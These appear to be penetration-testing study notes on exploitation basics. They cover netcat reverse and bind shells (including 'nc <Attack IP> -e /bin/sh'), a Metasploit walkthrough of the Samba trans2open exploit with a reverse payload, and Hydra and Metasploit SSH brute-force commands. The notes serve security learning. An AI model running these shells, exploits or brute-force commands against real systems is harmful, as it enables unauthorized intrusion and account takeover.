# Exploitation Basics

## Reverse Shells vs Bind Shells

### Reverse Shell

A victim connects to us.

#### Attacker

```bash
nc -lvnp 4444  # Listening
```

#### Target

```bash
nc <Attack IP> -e /bin/sh  # Connecting
```

### Bind Shell

We connect to the victim.

#### Attacker

```bash
nc <Target IP> 4444  # Connecting
```

#### Target

```bash
nc -lvnp 4444 -e /bin/sh  # Listening
```

## Staged vs Non-Staged Payloads

### Staged

* Sends payload in stages
* Can be less stable
* Example: `windows/meterpreter/reverse_tcp`

### Non-staged

* Sends exploit shellcode all at once
* Larger in size and won't always work
* Example: `windows/meterpreter_reverse_tcp`

## Gaining Root with Metasploit

### Example

```bash
searchsploit samba 2.2
# Found a 'trans2open' vulnerability with (Metasploit) mentioned
msfconsole
search trans2open
use exploit/linux/samba/trans2open
set RHOSTS <Target IP>
run / exploit
# Session kept opening and closing...
# Looking at the options we see the payload linux/x86/meterpreter/reverse_tcp
# Since this didn't work we can change it to a Non-staged payload
set payload linux/x86/shell_reverse_tcp
run / exploit
```

## Manual Exploitation

### Example

Finding an Apache mod\_ssl < 2.8.7 vulnerability

Used Google to identify there is an exploit called OpenLuck on GitHub

Followed the steps on GitHub to download, install, compile, and run the exploit.

## Brute Force Attacks

### Tools

#### Hydra

```bash
hydra -l <user> -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://<IP> -t 4
```

#### Metasploit

```bash
search ssh
use auxiliary/scanner/ssh/ssh_login
set USERNAME root
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set RHOSTS <IP>
run
```

## Credential Stuffing and Password Spraying

### What is Credential Stuffing?

Injecting breached account credentials in hopes of account takeover by testing large volumes of stolen usernames and passwords across multiple sites.

### What is Password Spraying?

Injecting breached account credentials in hopes of account takeover by attempting to access a large number of sites using known account identifiers (usernames) with a few commonly used passwords.

## Metasploit Unleashed

{% embed url="https://www.offensive-security.com/metasploit-unleashed" %}

## Armitage

_Armitage_ is a fantastic Java-based GUI front-end for the Metasploit Framework developed by Raphael Mudge. Its goal is to help security professionals better understand hacking and help them realize the power and potential of Metasploit.

{% embed url="https://www.offensive-security.com/metasploit-unleashed/armitage" %}
